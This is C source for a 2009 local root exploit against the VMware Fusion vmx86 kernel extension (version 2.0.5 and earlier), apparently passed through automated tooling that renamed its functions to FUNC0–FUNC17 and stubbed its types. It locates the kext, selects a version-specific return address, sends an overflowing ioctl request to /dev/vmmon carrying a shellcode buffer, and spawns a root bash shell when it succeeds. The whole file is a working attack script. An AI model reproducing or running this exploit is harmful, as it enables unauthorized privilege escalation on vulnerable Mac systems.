#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
struct ioctl_req {int /*<<< orphan*/ * pad; } ;
typedef  int /*<<< orphan*/  mach_port_t ;
struct TYPE_3__ {char* version; int address; scalar_t__ size; int /*<<< orphan*/ * name; scalar_t__ next; } ;
typedef  TYPE_1__ kmod_info_t ;
typedef  scalar_t__ kern_return_t ;
struct TYPE_4__ {int shell_addr; int /*<<< orphan*/ * name; } ;

/* Variables and functions */
 int /*<<< orphan*/  EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 scalar_t__ KERN_SUCCESS ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  VMX86_INIT_IOCTL ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (char*,char**,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,char*,...) ; 
 int FUNC5 () ; 
 int FUNC6 (int,int /*<<< orphan*/ ,struct ioctl_req*) ; 
 scalar_t__ FUNC7 (int /*<<< orphan*/ ,void*,unsigned int*) ; 
 char* FUNC8 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC9 () ; 
 int /*<<< orphan*/  FUNC10 (int /*<<< orphan*/ **,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC11 (struct ioctl_req*,int,int) ; 
 int FUNC12 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*,...) ; 
 int /*<<< orphan*/  FUNC14 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 scalar_t__ FUNC15 (int /*<<< orphan*/ *,char*) ; 
 char* FUNC16 (int /*<<< orphan*/ *,char) ; 
 TYPE_2__* targets_t ; 
 int /*<<< orphan*/  zleopard ; 

int
FUNC17 (int argc, char **argv)
{
  kmod_info_t *kmod_list, *k;
  mach_port_t host_port;
  kern_return_t mach_r;
  struct ioctl_req req;
  unsigned int count;
  int shell_addr;
  int fd, id, i, r;

  FUNC13 ("VMware Fusion <= 2.0.5 vmx86 kext local kernel root exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  host_port = FUNC9 ();
  mach_r = FUNC7 (host_port, (void *) &kmod_list, &count);
  if (mach_r != KERN_SUCCESS)
    {
      FUNC4 (stderr, "* couldn't get list of loaded kexts from kernel - %s\n",
               FUNC8 (mach_r));
      FUNC2 (EXIT_FAILURE);
    }

  for (k = kmod_list; k; k = (k->next) ? (k + 1) : NULL)
    if (FUNC15 (k->name, "com.vmware.kext.vmx86") == 0)
      break;

  if (k == NULL)
    {
      FUNC4 (stderr, "%s: vmx86 kext not loaded?\n", argv[0]);
      FUNC2 (EXIT_FAILURE);
    }

  for (i = 0; targets_t[i].name; i++)
    if (FUNC15 (targets_t[i].name, k->version) == 0)
      {
        shell_addr = targets_t[i].shell_addr;
        break;
      }

  if (targets_t[i].name == NULL)
    {
      FUNC4 (stderr, "%s: unsupported vmx86 version found :( [%s]\n",
               argv[0], k->version);
      FUNC2 (EXIT_FAILURE);
    }

  FUNC13 ("* kmod: %s, version: %s, addr: 0x%08X -> 0x%08X\n",
          FUNC16 (k->name, '.') + 1, k->version, (int) k->address, (int) (k->address + k->size));
  FUNC13 ("* ret addr: 0x%08X + 0x%08X = @0x%08X\n",
          (int) k->address, shell_addr + 0x1000, (int) k->address + shell_addr + 0x1000);

  fd = FUNC12 ("/dev/vmmon", O_RDONLY);
  if (fd < 0)
    {
      FUNC4 (stderr, "%s: open failed\n", argv[0]);
      FUNC2 (EXIT_FAILURE);
    }

  FUNC11 (&req, 0xCC, sizeof req);
  FUNC10 (&req.pad, zleopard, sizeof zleopard - 1);
  *(unsigned int *) &req.pad[0x21] = k->address + shell_addr + 0x1000;

  FUNC13 ("* hitting...");
  FUNC3 (stdout);
  FUNC14 (2);

  r = FUNC6 (fd, VMX86_INIT_IOCTL, &req);
  FUNC13 ("done\n\n");
  FUNC0 (fd);

  id = FUNC5 ();
  FUNC13 ("* getuid(): %d\n", id);
  if (id == 0)
    {
      char *args[] = { "/bin/bash", NULL };
      FUNC13 ("+Wh00t\n\n");

      FUNC1 (args[0], args, NULL);
    }
  else
    FUNC4 (stderr, "%s: failed to obtain root :(\n", argv[0]);

  return (EXIT_SUCCESS);
}